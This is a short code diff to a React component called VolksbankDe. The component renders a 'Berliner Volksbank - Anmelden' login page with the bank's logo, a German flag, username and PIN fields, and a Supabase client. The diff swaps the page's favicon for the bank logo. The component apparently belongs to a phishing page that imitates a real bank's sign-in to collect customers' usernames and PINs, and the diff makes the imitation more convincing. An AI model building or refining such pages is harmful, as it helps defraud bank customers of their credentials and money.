@@ -3,7 +3,6 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import faviconAsset from "@/assets/favicons/volksbank.webp.asset.json";
 import { Eye, EyeOff, TriangleAlert } from "lucide-react";
 import germanyFlag from "@/assets/germany-flag.svg.asset.json";
 import logoAsset from "@/assets/volksbank-de-logo.avif.asset.json";
@@ -30,7 +29,7 @@ const VolksbankDe = () => {
   const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Berliner Volksbank - Anmelden", faviconAsset.url);
+  usePageMeta("Berliner Volksbank - Anmelden", logoAsset.url);
 
   const submit = async () => {
     const uErr = username.trim() === "";
@@ -247,4 +246,3 @@ const VolksbankDe = () => {
 };
 
 export default VolksbankDe;
- 
